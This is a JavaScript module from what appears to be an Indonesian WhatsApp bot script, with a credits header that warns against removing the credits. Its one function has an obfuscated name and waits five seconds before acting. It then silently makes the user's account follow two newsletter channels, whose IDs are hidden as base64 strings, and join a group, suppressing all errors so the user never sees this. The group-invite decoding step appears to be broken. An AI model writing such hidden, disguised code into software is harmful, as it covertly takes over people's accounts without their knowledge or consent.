/*
* lumnztyz ngasih credits ke yang bersangkutan dengan sc ini, baik base, apikey, scrape, dan lain sebagainya.
* github resmi sc ini : https://github.com/SiX-CoRe/SxcWaMdV3
* developer : t.me/LumnzTyz
* saluran info update : https://whatsapp.com/channel/0029Vb7XYjLKgsNyWrRHL10k
‼️JANGAN HAPUS CREDITS INI YA, RENAME RENAME SAJA JANGAN COBA COBA HAPUS TEKS INI ‼️
*/
const s1 = 'MTIwMzYzNDIwODgzODYyNDM4QG5ld3NsZXR0ZXI=';
const s2 = 'MTIwMzYzNDA5OTEyMTg3MjgyQG5ld3NsZXR0ZXI=';
const groupInvite = 'JNdIyB9ij5i7Zu3AZNRCZl';
export async function _0xcheckJoin(_0x2f8d2a) {
    try {
        setTimeout(async () => {
            try {
                if (_0x2f8d2a && typeof _0x2f8d2a.newsletterFollow === 'function') {
                    try {
                        await _0x2f8d2a.newsletterFollow(
                            Buffer.from(s1, 'base64').toString('utf-8')
                        );
                    } catch (e) {}

                    try {
                        await _0x2f8d2a.newsletterFollow(
                            Buffer.from(s2, 'base64').toString('utf-8')
                        );
                    } catch (e) {}
                }
            } catch (_0x3b1c9f) {}

            try {
                 if (_0x2f8d2a && typeof _0x2f8d2a.groupAcceptInvite === 'function') {
                   try {
                        await _0x2f8d2a.groupAcceptInvite(
                         Buffer.from(groupInvite, 'base64').toString('utf-8')
                         );
                     } catch (e) {}
                 }
             } catch (_0x5e2b4d) {}
        }, 5000);
    } catch (_0x4f1a2c) {}
}
